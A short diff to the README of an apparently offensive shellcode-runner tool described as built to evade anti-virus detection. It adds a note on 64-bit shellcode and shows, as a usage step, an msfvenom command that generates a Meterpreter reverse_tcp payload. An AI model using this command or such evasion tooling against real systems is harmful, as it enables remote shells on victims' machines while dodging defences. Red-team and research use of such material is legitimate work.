@@ -6,6 +6,10 @@ written to defeat anti-virus detection.
 
 Usage
 =====
+
+Keep in mind that only 64bit shellcode will run in a 64bit process. This can't
+autodetect your shellcode architecture.
+
 Use msfvenom or metasploit to generate a bit of shellcode as hex format:
 ```
 $ msfvenom -p windows/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
